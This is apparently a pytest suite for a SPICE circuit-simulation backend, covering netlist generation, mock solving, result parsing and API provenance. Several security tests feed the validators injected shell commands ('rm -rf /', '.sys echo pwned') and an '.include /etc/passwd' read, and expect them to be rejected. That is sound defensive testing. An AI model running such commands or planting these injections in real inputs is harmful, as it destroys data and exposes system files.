import hashlib
import pytest
from app.models.db.analysis import AnalysisConfidence, AnalysisStatus, CircuitAnalysis
from app.models.db.circuit import Circuit, CircuitValidationStatus
from app.models.db.component import Component
from app.models.db.connection import Connection
from app.models.db.net import Net
from app.models.db.simulation import (
    ConvergenceStatus,
    ExecutionMode,
    SimulationJob,
    SimulationResultRecord,
    SimulationStatus,
    SimulationType,
    SimulatorType,
)
from app.models.schemas.simulation import (
    SimulationConstraintEvaluation,
    SimulationDiscrepancy,
    SimulationRunRequest,
)
from app.services.ai.analysis.units import UnitNormalizer
from app.services.ai.simulation.interpretation_service import SimulationInterpretationService
from app.services.ai.simulation.mock_simulator import MockSimulator
from app.services.ai.simulation.model_registry import SpiceModelRegistry
from app.services.ai.simulation.netlist_generator import NetlistGenerator, NetlistValidationResult
from app.services.ai.simulation.ngspice_simulator import NgSpiceSimulator
from app.services.ai.simulation.result_parser import SpiceResultParser
from app.services.ai.simulation.simulator_base import SimulationExecutionResult, SimulatorBase


# Helper fixtures for circuit graphs
def create_test_voltage_divider_circuit():
    circuit = Circuit(
        id="circ-sim-101",
        project_id="proj-sim-001",
        tenant_id="tenant-sim-001",
        name="Test Voltage Divider",
        version=1,
        created_by="user-123",
        validation_status=CircuitValidationStatus.VALID.value,
    )

    v1 = Component(
        id="comp-v1",
        circuit_id=circuit.id,
        ref_des="V1",
        component_type="VOLTAGE_SOURCE",
        value="5V",
    )
    r1 = Component(
        id="comp-r1",
        circuit_id=circuit.id,
        ref_des="R1",
        component_type="RESISTOR",
        value="10k",
    )
    r2 = Component(
        id="comp-r2",
        circuit_id=circuit.id,
        ref_des="R2",
        component_type="RESISTOR",
        value="10k",
    )

    net_vcc = Net(id="net-vcc", circuit_id=circuit.id, name="VCC", net_type="POWER")
    net_div = Net(id="net-div", circuit_id=circuit.id, name="V_DIV", net_type="SIGNAL")
    net_gnd = Net(id="net-gnd", circuit_id=circuit.id, name="GND", net_type="GROUND")

    # V1 pins: 1 -> VCC, 2 -> GND
    # R1 pins: 1 -> VCC, 2 -> V_DIV
    # R2 pins: 1 -> V_DIV, 2 -> GND
    c1 = Connection(id="conn-1", circuit_id=circuit.id, component_id=v1.id, pin_number="1", net_id=net_vcc.id)
    c2 = Connection(id="conn-2", circuit_id=circuit.id, component_id=v1.id, pin_number="2", net_id=net_gnd.id)
    c3 = Connection(id="conn-3", circuit_id=circuit.id, component_id=r1.id, pin_number="1", net_id=net_vcc.id)
    c4 = Connection(id="conn-4", circuit_id=circuit.id, component_id=r1.id, pin_number="2", net_id=net_div.id)
    c5 = Connection(id="conn-5", circuit_id=circuit.id, component_id=r2.id, pin_number="1", net_id=net_div.id)
    c6 = Connection(id="conn-6", circuit_id=circuit.id, component_id=r2.id, pin_number="2", net_id=net_gnd.id)

    circuit.components = [v1, r1, r2]
    circuit.nets = [net_vcc, net_div, net_gnd]
    circuit.connections = [c1, c2, c3, c4, c5, c6]
    return circuit


class TestPhase3Wave4SpiceSimulation:
    """Comprehensive test suite for Phase 3 Wave 4 SPICE & Simulation Integration."""

    # 1. SimulatorBase contract
    def test_01_simulator_base_contract(self):
        mock_sim = MockSimulator()
        assert isinstance(mock_sim, SimulatorBase)
        assert mock_sim.simulator_name == SimulatorType.MOCK_SPICE.value
        assert mock_sim.is_available() is True
        assert isinstance(mock_sim.simulator_version, str)

    # 2. NgSpice availability and version
    def test_02_ngspice_simulator_availability(self):
        ng_sim = NgSpiceSimulator(executable_path="/non/existent/ngspice_bin")
        assert ng_sim.is_available() is False
        assert ng_sim.simulator_version == "ngspice-unavailable"

    # 3. NgSpice netlist safety validation
    def test_03_ngspice_netlist_safety_validation(self):
        ng_sim = NgSpiceSimulator()
        # Empty netlist rejected
        valid, err = ng_sim.validate_netlist("")
        assert valid is False
        assert "empty" in err.lower()

        # Missing .end rejected
        valid, err = ng_sim.validate_netlist("Title\nR1 1 0 1k")
        assert valid is False
        assert ".end" in err.lower()

        # Shell escape / injection rejected
        valid, err = ng_sim.validate_netlist("Title\n.sys echo pwned\n.end")
        assert valid is False
        assert "forbidden" in err.lower()

        valid, err = ng_sim.validate_netlist("Title\n`rm -rf /`\n.end")
        assert valid is False
        assert "forbidden" in err.lower()

    # 4. NgSpice execution when unavailable returns structured result
    def test_04_ngspice_execution_when_unavailable(self):
        ng_sim = NgSpiceSimulator(executable_path="/non/existent/ngspice")
        res = ng_sim.execute("Title\nR1 1 0 1k\n.end")
        assert res.success is False
        assert res.convergence_status == ConvergenceStatus.NOT_RUN.value
        assert "not available" in res.error_message

    # 5. MockSimulator deterministic DC voltage divider solution
    def test_05_mock_simulator_voltage_divider(self):
        mock_sim = MockSimulator()
        netlist = (
            "* Voltage Divider Test\n"
            "V1 VCC 0 DC 5.0\n"
            "R1 VCC V_DIV 10k\n"
            "R2 V_DIV 0 10k\n"
            ".op\n"
            ".end\n"
        )
        res = mock_sim.execute(netlist)
        assert res.success is True
        assert res.convergence_status == ConvergenceStatus.CONVERGED.value
        assert pytest.approx(res.node_voltages["VCC"], 1e-4) == 5.0
        assert pytest.approx(res.node_voltages["V_DIV"], 1e-4) == 2.5
        assert pytest.approx(res.node_voltages["0"], 1e-4) == 0.0

        # Current should be 5V / (10k + 10k) = 0.25 mA = 0.00025 A
        assert pytest.approx(abs(res.branch_currents["v1"]), 1e-6) == 0.00025
        assert pytest.approx(res.branch_currents["r1"], 1e-6) == 0.00025
        assert pytest.approx(res.branch_currents["r2"], 1e-6) == 0.00025

    # 6. MockSimulator Ohm's law single resistor
    def test_06_mock_simulator_ohms_law(self):
        mock_sim = MockSimulator()
        netlist = (
            "* Single Resistor\n"
            "V1 1 0 DC 10\n"
            "R1 1 0 1k\n"
            ".end\n"
        )
        res = mock_sim.execute(netlist)
        assert res.success is True
        assert pytest.approx(res.node_voltages["1"], 1e-4) == 10.0
        assert pytest.approx(abs(res.branch_currents["v1"]), 1e-5) == 0.010  # 10mA

    # 7. MockSimulator parallel resistors
    def test_07_mock_simulator_parallel_resistors(self):
        mock_sim = MockSimulator()
        netlist = (
            "* Parallel Resistors\n"
            "V1 1 0 DC 12\n"
            "R1 1 0 100\n"
            "R2 1 0 100\n"
            ".end\n"
        )
        res = mock_sim.execute(netlist)
        assert res.success is True
        # Total current: 12/100 + 12/100 = 0.12 + 0.12 = 0.24 A
        assert pytest.approx(abs(res.branch_currents["v1"]), 1e-4) == 0.24

    # 8. MockSimulator missing ground node reports SINGULAR_MATRIX
    def test_08_mock_simulator_missing_ground(self):
        mock_sim = MockSimulator()
        netlist = (
            "* Floating circuit\n"
            "V1 1 2 DC 5\n"
            "R1 1 2 1k\n"
            ".end\n"
        )
        res = mock_sim.execute(netlist)
        assert res.success is False
        assert res.convergence_status == ConvergenceStatus.SINGULAR_MATRIX.value
        assert "no ground" in res.error_message.lower()

    # 9. MockSimulator ill-conditioned / short-circuit detection
    def test_09_mock_simulator_singular_matrix(self):
        mock_sim = MockSimulator()
        # Direct parallel conflicting ideal voltage sources
        netlist = (
            "* Conflicting Sources\n"
            "V1 1 0 DC 5\n"
            "V2 1 0 DC 10\n"
            ".end\n"
        )
        res = mock_sim.execute(netlist)
        assert res.success is False
        assert res.convergence_status == ConvergenceStatus.SINGULAR_MATRIX.value

    # 10. MockSimulator transient simulation output vectors
    def test_10_mock_simulator_transient_vectors(self):
        mock_sim = MockSimulator()
        netlist = (
            "* Transient\n"
            "V1 1 0 DC 3.3\n"
            "R1 1 0 10k\n"
            ".tran 10u 1m\n"
            ".end\n"
        )
        res = mock_sim.execute(netlist, config={"simulation_type": "TRANSIENT", "tstop": 0.001, "tstep": 1e-4})
        assert res.success is True
        assert "time" in res.parsed_vectors
        assert len(res.parsed_vectors["time"]) > 5
        assert "v(1)" in res.parsed_vectors

    # 11. MockSimulator AC small signal simulation output vectors
    def test_11_mock_simulator_ac_vectors(self):
        mock_sim = MockSimulator()
        netlist = (
            "* AC Sweep\n"
            "V1 1 0 DC 3.3\n"
            "R1 1 0 10k\n"
            ".ac dec 10 10 100k\n"
            ".end\n"
        )
        res = mock_sim.execute(netlist, config={"simulation_type": "AC_SMALL_SIGNAL", "start_freq": 10.0, "stop_freq": 100000.0})
        assert res.success is True
        assert "frequency" in res.parsed_vectors
        assert len(res.parsed_vectors["frequency"]) > 5

    # 12. MockSimulator forced failure mode simulation
    def test_12_mock_simulator_forced_failure(self):
        mock_sim = MockSimulator()
        netlist = "* Test\nV1 1 0 DC 5\nR1 1 0 1k\n.end\n"
        res = mock_sim.execute(
            netlist,
            config={"force_convergence_status": ConvergenceStatus.MAX_ITERATIONS_EXCEEDED.value},
        )
        assert res.success is False
        assert res.convergence_status == ConvergenceStatus.MAX_ITERATIONS_EXCEEDED.value

    # 13. SpiceModelRegistry built-in models
    def test_13_model_registry_built_in_catalog(self):
        for part in ["1N4148", "1N4001", "BZX84C5V1", "2N2222", "2N3904", "2N7000"]:
            model = SpiceModelRegistry.get_model(part)
            assert model is not None
            assert part in model
            assert ".model" in model

    # 14. SpiceModelRegistry syntax and security validation
    def test_14_model_registry_validation(self):
        # Valid diode model
        valid_model = ".model DMOD D (IS=1e-14 RS=0.1)"
        ok, err = SpiceModelRegistry.validate_model_text(valid_model)
        assert ok is True
        assert err is None

        # Rejects shell execution
        bad_model = ".model BAD D (IS=1e-14) ; rm -rf /"
        ok, err = SpiceModelRegistry.validate_model_text(bad_model)
        assert ok is False
        assert "forbidden" in err.lower()

    # 15. SpiceModelRegistry disallows .include directives
    def test_15_model_registry_disallow_include(self):
        inc_model = ".include /etc/passwd\n.model D1 D"
        ok, err = SpiceModelRegistry.validate_model_text(inc_model)
        assert ok is False
        assert ".include" in err

    # 16. SpiceModelRegistry subcircuit termination check
    def test_16_model_registry_subckt_ends(self):
        unclosed_subckt = ".subckt OPAMP 1 2 3 4 5\nR1 1 2 10k"
        ok, err = SpiceModelRegistry.validate_model_text(unclosed_subckt)
        assert ok is False
        assert ".ends" in err.lower()

    # 17. SpiceModelRegistry deterministic SHA-256 digest
    def test_17_model_registry_digest_consistency(self):
        models = [".model M1 D", ".model M2 NPN"]
        d1 = SpiceModelRegistry.compute_model_digest(models)
        d2 = SpiceModelRegistry.compute_model_digest(list(reversed(models)))
        assert d1 == d2  # Order-independent deterministic digest
        assert len(d1) == 64

    # 18. NetlistGenerator identifier sanitization
    def test_18_netlist_generator_sanitization(self):
        assert NetlistGenerator.sanitize_identifier("PWR#RAIL/1") == "PWR_RAIL_1"
        assert NetlistGenerator.sanitize_identifier("Normal_Node") == "Normal_Node"

    # 19. NetlistGenerator ground net identification
    def test_19_netlist_generator_ground_net(self):
        assert NetlistGenerator.is_ground_net("GND") is True
        assert NetlistGenerator.is_ground_net("0V") is True
        assert NetlistGenerator.is_ground_net("GROUND") is True
        assert NetlistGenerator.is_ground_net("0") is True
        assert NetlistGenerator.is_ground_net("VCC") is False

    # 20. NetlistGenerator format SPICE values using UnitNormalizer
    def test_20_netlist_generator_format_values(self):
        assert NetlistGenerator.format_spice_value("10k") == "10000"
        assert NetlistGenerator.format_spice_value("4.7uF") == "4.7e-06"
        assert NetlistGenerator.format_spice_value(100) == "100"

    # 21. NetlistGenerator generates resistor element R<ref> <n1> <n2> <val>
    def test_21_netlist_generator_resistor(self):
        c = Circuit(id="c-r", project_id="p1", name="Resistor Circuit", created_by="u1")
        r1 = Component(id="r1", circuit_id=c.id, ref_des="R1", component_type="RESISTOR", value="4.7k")
        n1 = Net(id="n1", circuit_id=c.id, name="IN")
        n0 = Net(id="n0", circuit_id=c.id, name="GND")
        c1 = Connection(id="c1", circuit_id=c.id, component_id=r1.id, pin_number="1", net_id=n1.id)
        c2 = Connection(id="c2", circuit_id=c.id, component_id=r1.id, pin_number="2", net_id=n0.id)
        c.components = [r1]
        c.nets = [n1, n0]
        c.connections = [c1, c2]
        res = NetlistGenerator.generate(c)
        assert res.is_valid is True
        assert "R1 IN 0 4700" in res.netlist

    # 22. NetlistGenerator generates capacitor element C<ref> <n1> <n2> <val>
    def test_22_netlist_generator_capacitor(self):
        c = Circuit(id="c-c", project_id="p1", name="Capacitor Circuit", created_by="u1")
        c1_comp = Component(id="c1", circuit_id=c.id, ref_des="C1", component_type="CAPACITOR", value="100nF")
        n1 = Net(id="n1", circuit_id=c.id, name="SIG")
        n0 = Net(id="n0", circuit_id=c.id, name="GND")
        conn1 = Connection(id="cn1", circuit_id=c.id, component_id=c1_comp.id, pin_number="1", net_id=n1.id)
        conn2 = Connection(id="cn2", circuit_id=c.id, component_id=c1_comp.id, pin_number="2", net_id=n0.id)
        c.components = [c1_comp]
        c.nets = [n1, n0]
        c.connections = [conn1, conn2]
        res = NetlistGenerator.generate(c)
        assert res.is_valid is True
        assert "C1 SIG 0 1e-07" in res.netlist

    # 23. NetlistGenerator generates inductor element L<ref> <n1> <n2> <val>
    def test_23_netlist_generator_inductor(self):
        c = Circuit(id="c-l", project_id="p1", name="Inductor Circuit", created_by="u1")
        l1 = Component(id="l1", circuit_id=c.id, ref_des="L1", component_type="INDUCTOR", value="10uH")
        n1 = Net(id="n1", circuit_id=c.id, name="RF")
        n0 = Net(id="n0", circuit_id=c.id, name="GND")
        conn1 = Connection(id="cn1", circuit_id=c.id, component_id=l1.id, pin_number="1", net_id=n1.id)
        conn2 = Connection(id="cn2", circuit_id=c.id, component_id=l1.id, pin_number="2", net_id=n0.id)
        c.components = [l1]
        c.nets = [n1, n0]
        c.connections = [conn1, conn2]
        res = NetlistGenerator.generate(c)
        assert res.is_valid is True
        assert "L1 RF 0 1e-05" in res.netlist

    # 24. NetlistGenerator generates voltage source element V<ref> <n+> <n-> DC <val>
    def test_24_netlist_generator_voltage_source(self):
        c = Circuit(id="c-v", project_id="p1", name="Voltage Circuit", created_by="u1")
        v1 = Component(id="v1", circuit_id=c.id, ref_des="V1", component_type="VOLTAGE_SOURCE", value="12V")
        n1 = Net(id="n1", circuit_id=c.id, name="12V_RAIL")
        n0 = Net(id="n0", circuit_id=c.id, name="GND")
        conn1 = Connection(id="cn1", circuit_id=c.id, component_id=v1.id, pin_number="1", net_id=n1.id)
        conn2 = Connection(id="cn2", circuit_id=c.id, component_id=v1.id, pin_number="2", net_id=n0.id)
        c.components = [v1]
        c.nets = [n1, n0]
        c.connections = [conn1, conn2]
        res = NetlistGenerator.generate(c)
        assert res.is_valid is True
        assert "V1 12V_RAIL 0 DC 12" in res.netlist

    # 25. NetlistGenerator generates current source element I<ref> <n+> <n-> DC <val>
    def test_25_netlist_generator_current_source(self):
        c = Circuit(id="c-i", project_id="p1", name="Current Source Circuit", created_by="u1")
        i1 = Component(id="i1", circuit_id=c.id, ref_des="I1", component_type="CURRENT_SOURCE", value="20mA")
        n1 = Net(id="n1", circuit_id=c.id, name="BIAS")
        n0 = Net(id="n0", circuit_id=c.id, name="GND")
        conn1 = Connection(id="cn1", circuit_id=c.id, component_id=i1.id, pin_number="1", net_id=n1.id)
        conn2 = Connection(id="cn2", circuit_id=c.id, component_id=i1.id, pin_number="2", net_id=n0.id)
        c.components = [i1]
        c.nets = [n1, n0]
        c.connections = [conn1, conn2]
        res = NetlistGenerator.generate(c)
        assert res.is_valid is True
        assert "I1 BIAS 0 DC 0.02" in res.netlist

    # 26. NetlistGenerator includes diode models
    def test_26_netlist_generator_diode(self):
        circuit = Circuit(id="c-d", project_id="p1", name="Diode Circuit", created_by="u1")
        d1 = Component(id="d1", circuit_id=circuit.id, ref_des="D1", component_type="DIODE", part_number="1N4148", value="1N4148")
        n1 = Net(id="n1", circuit_id=circuit.id, name="IN")
        n0 = Net(id="n0", circuit_id=circuit.id, name="GND")
        c1 = Connection(id="c1", circuit_id=circuit.id, component_id=d1.id, pin_number="1", net_id=n1.id)
        c2 = Connection(id="c2", circuit_id=circuit.id, component_id=d1.id, pin_number="2", net_id=n0.id)
        circuit.components = [d1]
        circuit.nets = [n1, n0]
        circuit.connections = [c1, c2]

        res = NetlistGenerator.generate(circuit)
        assert res.is_valid is True
        assert "D1" in res.netlist
        assert "1N4148" in res.models_included
        assert ".model 1N4148" in res.netlist

    # 27. NetlistGenerator includes transistor models
    def test_27_netlist_generator_transistor(self):
        circuit = Circuit(id="c-q", project_id="p1", name="BJT Circuit", created_by="u1")
        q1 = Component(id="q1", circuit_id=circuit.id, ref_des="Q1", component_type="TRANSISTOR", part_number="2N2222", value="2N2222")
        nc = Net(id="nc", circuit_id=circuit.id, name="VCC")
        nb = Net(id="nb", circuit_id=circuit.id, name="BASE")
        ne = Net(id="ne", circuit_id=circuit.id, name="GND")
        c1 = Connection(id="c1", circuit_id=circuit.id, component_id=q1.id, pin_number="1", net_id=nc.id)
        c2 = Connection(id="c2", circuit_id=circuit.id, component_id=q1.id, pin_number="2", net_id=nb.id)
        c3 = Connection(id="c3", circuit_id=circuit.id, component_id=q1.id, pin_number="3", net_id=ne.id)
        circuit.components = [q1]
        circuit.nets = [nc, nb, ne]
        circuit.connections = [c1, c2, c3]

        res = NetlistGenerator.generate(circuit)
        assert res.is_valid is True
        assert "Q1" in res.netlist
        assert "2N2222" in res.models_included

    # 28. NetlistGenerator simulation directives
    def test_28_netlist_generator_directives(self):
        circuit = create_test_voltage_divider_circuit()
        res_dc = NetlistGenerator.generate(
            circuit,
            simulation_type=SimulationType.DC_SWEEP.value,
            config={"sweep_source": "V1", "start_voltage": 0.0, "stop_voltage": 5.0, "step_voltage": 0.5},
        )
        assert ".dc V1 0.0 5.0 0.5" in res_dc.netlist

        res_ac = NetlistGenerator.generate(
            circuit,
            simulation_type=SimulationType.AC_SMALL_SIGNAL.value,
            config={"points_per_decade": 10, "start_freq": 10.0, "stop_freq": 100000.0},
        )
        assert ".ac dec 10 10.0 100000.0" in res_ac.netlist

        res_tran = NetlistGenerator.generate(
            circuit,
            simulation_type=SimulationType.TRANSIENT.value,
            config={"tstep": 1e-4, "tstop": 0.01},
        )
        assert ".tran 0.0001 0.01" in res_tran.netlist

    # 29. NetlistGenerator duplicate designator detection
    def test_29_netlist_generator_duplicate_designator(self):
        circuit = Circuit(id="c-dup", project_id="p1", name="Duplicate Circuit", created_by="u1")
        r1_a = Component(id="r1a", circuit_id=circuit.id, ref_des="R1", component_type="RESISTOR", value="1k")
        r1_b = Component(id="r1b", circuit_id=circuit.id, ref_des="R1", component_type="RESISTOR", value="2k")
        circuit.components = [r1_a, r1_b]
        circuit.nets = []
        circuit.connections = []

        res = NetlistGenerator.generate(circuit)
        assert res.is_valid is False
        assert any("duplicate" in err.lower() for err in res.errors)

    # 30. NetlistGenerator SHA-256 netlist digest deterministic
    def test_30_netlist_digest_deterministic(self):
        c1 = create_test_voltage_divider_circuit()
        r1 = NetlistGenerator.generate(c1)
        r2 = NetlistGenerator.generate(c1)
        assert r1.netlist_digest == r2.netlist_digest

    # 31. SpiceResultParser detects convergence statuses
    def test_31_result_parser_convergence_detection(self):
        assert SpiceResultParser.detect_convergence("Simulation completed successfully") == ConvergenceStatus.CONVERGED.value
        assert SpiceResultParser.detect_convergence("Error: Singular matrix at node 2") == ConvergenceStatus.SINGULAR_MATRIX.value
        assert SpiceResultParser.detect_convergence("Fatal error: Timestep too small at t=1.2e-6") == ConvergenceStatus.TIMESTEP_TOO_SMALL.value
        assert SpiceResultParser.detect_convergence("Iteration limit reached in DC op") == ConvergenceStatus.MAX_ITERATIONS_EXCEEDED.value
        assert SpiceResultParser.detect_convergence("Fatal error: No convergence in transient analysis") == ConvergenceStatus.NON_CONVERGENT.value

    # 32. SpiceResultParser parses DC operating point lines
    def test_32_result_parser_dc_operating_point(self):
        output = """
        Circuit: * Voltage Divider
        v(vcc) = 5.000000e+00
        v(v_div) = 2.500000e+00
        v1#branch = -2.500000e-04
        """
        nv, bi = SpiceResultParser.parse_dc_operating_point(output)
        assert pytest.approx(nv["vcc"], 1e-4) == 5.0
        assert pytest.approx(nv["v_div"], 1e-4) == 2.5
        assert pytest.approx(bi["v1"], 1e-6) == -0.00025

    # 33. SpiceResultParser parses transient/AC tabular traces
    def test_33_result_parser_tabular_traces(self):
        output = """
        Index   time            v(out)
        0       0.000000e+00    0.000000e+00
        1       1.000000e-03    2.500000e+00
        2       2.000000e-03    3.300000e+00
        """
        vecs = SpiceResultParser.parse_transient_or_ac(output)
        assert "time" in vecs
        assert "v(out)" in vecs
        assert len(vecs["time"]) == 3
        assert vecs["v(out)"][1] == 2.5

    # 34. SpiceResultParser computes summary metrics
    def test_34_result_parser_metrics(self):
        nv = {"vcc": 5.0, "v_div": 2.5, "0": 0.0}
        bi = {"vcc": 0.001}
        metrics = SpiceResultParser.compute_summary_metrics(nv, bi)
        assert metrics["max_node_voltage_v"] == 5.0
        assert metrics["min_node_voltage_v"] == 0.0
        assert pytest.approx(metrics["total_power_dissipation_w"], 1e-5) == 0.005

    # 35. SimulationInterpretationService matches analytical results
    def test_35_interpretation_matches_analytical(self):
        analysis = CircuitAnalysis(
            id="ana-1",
            circuit_id="circ-1",
            created_by="u1",
            calculations=[
                {"type": "DC_VOLTAGE", "node": "v_div", "value": 2.5, "unit": "V"},
                {"type": "DC_VOLTAGE", "node": "vcc", "value": 5.0, "unit": "V"},
            ],
        )
        sim_nv = {"v_div": 2.505, "vcc": 5.01}  # Within 1%
        discrepancies = SimulationInterpretationService.compare_with_analytical_analysis(
            analysis=analysis,
            node_voltages=sim_nv,
            branch_currents={},
        )
        assert len(discrepancies) == 2
        for d in discrepancies:
            assert d.flag == "MATCH"
            assert d.relative_delta < 0.05

    # 36. SimulationInterpretationService detects discrepancy when delta > 5%
    def test_36_interpretation_detects_discrepancy(self):
        analysis = CircuitAnalysis(
            id="ana-2",
            circuit_id="circ-1",
            created_by="u1",
            calculations=[
                {"type": "DC_VOLTAGE", "node": "v_div", "value": 2.5, "unit": "V"},
            ],
        )
        sim_nv = {"v_div": 3.1}  # 24% difference!
        discrepancies = SimulationInterpretationService.compare_with_analytical_analysis(
            analysis=analysis,
            node_voltages=sim_nv,
            branch_currents={},
        )
        assert len(discrepancies) == 1
        assert discrepancies[0].flag == "ANALYSIS_SIMULATION_DISCREPANCY"
        assert discrepancies[0].relative_delta > 0.05

    # 37. SimulationInterpretationService evaluates operating constraints
    def test_37_interpretation_evaluates_constraints(self):
        circuit = Circuit(id="c-constr", project_id="p1", name="Constraint Test", created_by="u1")
        # Resistor rated for 0.25W and max 50V
        r1 = Component(
            id="comp-r1",
            circuit_id=circuit.id,
            ref_des="R1",
            component_type="RESISTOR",
            value="100",
            metadata_={"max_voltage": 20.0, "power_rating": 0.5},
        )
        circuit.components = [r1]

        # Case A: Safe operating point: 5V, 0.05A -> P = 0.25W < 0.5W
        safe_evals = SimulationInterpretationService.evaluate_constraints(
            circuit=circuit,
            node_voltages={"r1": 5.0},
            branch_currents={"r1": 0.05},
        )
        assert len(safe_evals) >= 2
        assert all(e.status == "SATISFIED" for e in safe_evals)

        # Case B: Exceeded voltage: 25V > 20V
        violated_evals = SimulationInterpretationService.evaluate_constraints(
            circuit=circuit,
            node_voltages={"r1": 25.0},
            branch_currents={"r1": 0.25},
        )
        v_eval = next(e for e in violated_evals if e.parameter == "voltage")
        assert v_eval.status == "VIOLATED"

    # 38. Non-negotiable Epistemic Invariants
    def test_38_epistemic_invariants(self):
        """
        SIMULATION_RESULT != PHYSICAL_VERIFICATION.
        Zero synthetic scoring.
        CALCULATED_RESULT classification.
        """
        job = SimulationJob(
            id="job-1",
            project_id="p1",
            circuit_id="c1",
            created_by="u1",
            simulation_type=SimulationType.DC_OPERATING_POINT.value,
            status=SimulationStatus.COMPLETED.value,
            simulator=SimulatorType.MOCK_SPICE.value,
            execution_mode=ExecutionMode.TEST_MOCK.value,
        )

        res = SimulationResultRecord(
            id="res-1",
            simulation_job_id=job.id,
            circuit_id="c1",
            convergence_status=ConvergenceStatus.CONVERGED.value,
            node_voltages={"1": 3.3},
            branch_currents={},
            classification="CALCULATED_RESULT",
            verification_status="NOT_VERIFIED",
        )

        # Invariant 1: Verification status is strictly NOT_VERIFIED
        assert res.verification_status == "NOT_VERIFIED"
        assert res.verification_status != "VERIFIED"

        # Invariant 2: Classification is strictly CALCULATED_RESULT
        assert res.classification == "CALCULATED_RESULT"

        # Invariant 3: Zero synthetic scoring: no quality_score, winner, or confidence_percentage
        assert not hasattr(res, "confidence_score")
        assert not hasattr(res, "composite_score")
        assert not hasattr(res, "winner")

    # 39. SimulationService run_simulation end-to-end integration test
    @pytest.mark.asyncio
    async def test_39_simulation_service_e2e(self):
        from app.core.database import AsyncSessionLocal
        from app.core.dependencies import AuthenticatedUser
        from app.models.db.project import Project, ProjectStatus, ProjectType
        from app.services.simulation_service import simulation_service
        import uuid

        async with AsyncSessionLocal() as db:
            user = AuthenticatedUser(
                id="user-sim-test-1",
                email="sim@quebet.test",
                role="user",
                plan="pro",
                tenant_id="tenant-sim-test-1",
            )
            # Create project & circuit in DB
            proj = Project(
                id=str(uuid.uuid4()),
                tenant_id=user.tenant_id,
                name="Simulation E2E Project",
                owner_id=user.id,
                project_type=ProjectType.CIRCUIT.value,
                status=ProjectStatus.ACTIVE.value,
            )
            circuit = Circuit(
                id=str(uuid.uuid4()),
                project_id=proj.id,
                tenant_id=user.tenant_id,
                name="Voltage Divider E2E",
                version=1,
                created_by=user.id,
                validation_status=CircuitValidationStatus.VALID.value,
            )
            v1 = Component(
                id=str(uuid.uuid4()),
                circuit_id=circuit.id,
                ref_des="V1",
                component_type="VOLTAGE_SOURCE",
                value="10V",
            )
            r1 = Component(
                id=str(uuid.uuid4()),
                circuit_id=circuit.id,
                ref_des="R1",
                component_type="RESISTOR",
                value="1k",
            )
            n_in = Net(id=str(uuid.uuid4()), circuit_id=circuit.id, name="VIN", net_type="POWER")
            n_gnd = Net(id=str(uuid.uuid4()), circuit_id=circuit.id, name="GND", net_type="GROUND")
            c1 = Connection(id=str(uuid.uuid4()), circuit_id=circuit.id, component_id=v1.id, pin_number="1", net_id=n_in.id)
            c2 = Connection(id=str(uuid.uuid4()), circuit_id=circuit.id, component_id=v1.id, pin_number="2", net_id=n_gnd.id)
            c3 = Connection(id=str(uuid.uuid4()), circuit_id=circuit.id, component_id=r1.id, pin_number="1", net_id=n_in.id)
            c4 = Connection(id=str(uuid.uuid4()), circuit_id=circuit.id, component_id=r1.id, pin_number="2", net_id=n_gnd.id)

            db.add_all([proj, circuit, v1, r1, n_in, n_gnd, c1, c2, c3, c4])
            await db.commit()

            req = SimulationRunRequest(
                simulation_type=SimulationType.DC_OPERATING_POINT,
                simulator=SimulatorType.MOCK_SPICE,
            )
            job = await simulation_service.run_simulation(
                db=db,
                circuit_id=circuit.id,
                current_user=user,
                request=req,
            )

            assert job is not None
            assert job.status == SimulationStatus.COMPLETED.value
            assert job.result is not None
            assert job.result.convergence_status == ConvergenceStatus.CONVERGED.value
            assert pytest.approx(job.result.node_voltages["VIN"], 1e-4) == 10.0
            assert job.result.verification_status == "NOT_VERIFIED"
            assert job.result.classification == "CALCULATED_RESULT"

    # 40. API route POST simulation & GET provenance
    @pytest.mark.asyncio
    async def test_40_api_routes_simulation_flow(self, async_client):
        from app.core.database import AsyncSessionLocal
        from app.core.security import create_access_token
        from app.models.db.project import Project, ProjectStatus, ProjectType
        import uuid

        tenant_id = "tenant-api-sim-1"
        user_id = "user-api-sim-1"
        token = create_access_token(user_id, claims={"role": "user", "plan": "pro", "tenant_id": tenant_id})
        headers = {"Authorization": f"Bearer {token}"}

        # Seed circuit
        async with AsyncSessionLocal() as db:
            proj = Project(
                id=str(uuid.uuid4()),
                tenant_id=tenant_id,
                name="API Sim Proj",
                owner_id=user_id,
                project_type=ProjectType.CIRCUIT.value,
                status=ProjectStatus.ACTIVE.value,
            )
            circuit = Circuit(
                id=str(uuid.uuid4()),
                project_id=proj.id,
                tenant_id=tenant_id,
                name="API Circuit",
                version=1,
                created_by=user_id,
                validation_status=CircuitValidationStatus.VALID.value,
            )
            v1 = Component(id=str(uuid.uuid4()), circuit_id=circuit.id, ref_des="V1", component_type="VOLTAGE_SOURCE", value="5V")
            r1 = Component(id=str(uuid.uuid4()), circuit_id=circuit.id, ref_des="R1", component_type="RESISTOR", value="2k")
            n_in = Net(id=str(uuid.uuid4()), circuit_id=circuit.id, name="5V", net_type="POWER")
            n_gnd = Net(id=str(uuid.uuid4()), circuit_id=circuit.id, name="GND", net_type="GROUND")
            c1 = Connection(id=str(uuid.uuid4()), circuit_id=circuit.id, component_id=v1.id, pin_number="1", net_id=n_in.id)
            c2 = Connection(id=str(uuid.uuid4()), circuit_id=circuit.id, component_id=v1.id, pin_number="2", net_id=n_gnd.id)
            c3 = Connection(id=str(uuid.uuid4()), circuit_id=circuit.id, component_id=r1.id, pin_number="1", net_id=n_in.id)
            c4 = Connection(id=str(uuid.uuid4()), circuit_id=circuit.id, component_id=r1.id, pin_number="2", net_id=n_gnd.id)
            db.add_all([proj, circuit, v1, r1, n_in, n_gnd, c1, c2, c3, c4])
            await db.commit()
            circuit_id = circuit.id

        # POST /api/v1/circuits/{circuit_id}/simulations
        res = await async_client.post(
            f"/api/v1/circuits/{circuit_id}/simulations",
            json={
                "simulation_type": "DC_OPERATING_POINT",
                "simulator": "MOCK_SPICE",
            },
            headers=headers,
        )
        assert res.status_code == 200
        data = res.json()["data"]
        sim_id = data["id"]
        assert data["status"] == "COMPLETED"
        assert data["result"]["verification_status"] == "NOT_VERIFIED"
        assert data["result"]["classification"] == "CALCULATED_RESULT"

        # GET /api/v1/circuits/{circuit_id}/simulations/{id}/provenance
        prov_res = await async_client.get(
            f"/api/v1/circuits/{circuit_id}/simulations/{sim_id}/provenance",
            headers=headers,
        )
        assert prov_res.status_code == 200
        prov_data = prov_res.json()["data"]
        assert "SIMULATION_RESULT != PHYSICAL_VERIFICATION" in prov_data["epistemic_warning"]
